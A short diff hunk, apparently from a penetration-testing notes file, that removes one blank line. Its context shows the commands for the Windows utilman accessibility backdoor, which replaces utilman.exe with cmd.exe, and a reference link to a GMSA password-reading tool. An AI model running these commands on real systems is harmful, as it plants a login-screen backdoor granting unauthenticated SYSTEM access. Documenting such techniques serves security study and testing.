@@ -46,7 +46,6 @@ mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
 mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
-
 ### References
 
 - https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe
